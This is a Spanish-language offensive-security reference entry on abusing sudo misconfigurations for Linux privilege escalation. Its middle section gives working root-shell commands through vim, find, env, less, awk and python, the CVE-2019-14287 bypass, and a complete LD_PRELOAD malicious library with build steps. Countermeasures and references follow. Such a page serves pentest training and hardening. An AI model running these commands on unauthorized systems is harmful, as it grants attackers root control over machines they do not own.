---
title: Abuso de Configuraciones Sudo
slug: abuso-sudo
aliases: [Abuso de Configuraciones Sudo]
fase: [Post-Explotación]
plataforma: Linux
dificultad: Básica
mitre: [T1548.003]
related: []
learning_refs: []
---

# Abuso de Configuraciones Sudo

## Descripción
Sudo (superuser do) permite a usuarios sin privilegios ejecutar comandos como root u otros usuarios según la configuración definida en `/etc/sudoers`. Las configuraciones inseguras — como permitir comandos con `NOPASSWD`, asignar binarios que permiten escape a shell, o usar wildcards en las reglas — pueden ser explotadas por un atacante para escalar privilegios. Esta técnica es una de las primeras que se verifica tras obtener acceso inicial a un sistema Linux, ya que frecuentemente revela vectores de escalada directos.

## Herramientas
- **sudo** (`-l`, `-u`) — enumeración y ejecución de comandos permitidos
- **GTFOBins** (https://gtfobins.github.io/) — referencia de binarios que permiten escalar vía sudo
- **linPEAS** (`linpeas.sh`) — enumeración automatizada que reporta configuraciones sudo vulnerables
- **sudo_killer** (https://github.com/TH3xACE/SUDO_KILLER) — herramienta especializada en identificar vectores de abuso de sudo

## Comandos / Ejemplos

### Enumeración de permisos sudo
```bash
# Listar comandos permitidos para el usuario actual
sudo -l

# Ejemplo de salida vulnerable:
# User www-data may run the following commands on target:
#     (root) NOPASSWD: /usr/bin/vim
#     (root) NOPASSWD: /usr/bin/find
#     (ALL) NOPASSWD: /usr/bin/env

# Verificar versión de sudo (versiones < 1.8.28 pueden ser vulnerables a CVE-2019-14287)
sudo --version
```

### Explotación de binarios permitidos con sudo
```bash
# Si sudo permite ejecutar vim como root
sudo vim -c ':!/bin/bash'

# Si sudo permite ejecutar find como root
sudo find /etc -exec /bin/bash \; -quit

# Si sudo permite ejecutar env como root
sudo env /bin/bash

# Si sudo permite ejecutar less como root
sudo less /etc/hosts
# Dentro de less, escribir: !/bin/bash

# Si sudo permite ejecutar awk como root
sudo awk 'BEGIN {system("/bin/bash")}'

# Si sudo permite ejecutar python como root
sudo python3 -c 'import os; os.system("/bin/bash")'
```

### CVE-2019-14287 — Bypass de restricción de usuario
```bash
# Si la regla sudoers es: (ALL, !root) NOPASSWD: /bin/bash
# Se puede bypassear usando UID -1 (que se interpreta como 0/root)
sudo -u#-1 /bin/bash
```

### Abuso de sudo con variables de entorno
```bash
# Si sudo preserva LD_PRELOAD (env_keep+=LD_PRELOAD en sudoers)
# Compilar librería maliciosa
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/any_allowed_command
```

## Contramedidas
- Evitar el uso de `NOPASSWD` en reglas sudoers, especialmente para binarios que permiten escape a shell
- No asignar sudo a editores de texto (vim, nano, less), intérpretes (python, perl, ruby) ni utilidades con capacidad de ejecución (find, awk, env)
- Usar `Defaults !env_keep+=LD_PRELOAD` para prevenir inyección de librerías
- Configurar `Defaults timestamp_timeout=0` para evitar reutilización de credenciales sudo en caché
- Mantener sudo actualizado para prevenir vulnerabilidades como CVE-2019-14287
- Auditar `/etc/sudoers` periódicamente con `visudo -c` y revisar reglas permisivas

## Referencias
- MITRE Corporation. (2024). ATT&CK Technique T1548.003: Abuse Elevation Control Mechanism: Sudo and Sudo Caching. https://attack.mitre.org/techniques/T1548/003/
- GTFOBins. (s.f.). *GTFOBins* [Base de datos]. https://gtfobins.github.io/
- OccupyTheWeb. (2018). *Linux Basics for Hackers*. No Starch Press.
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
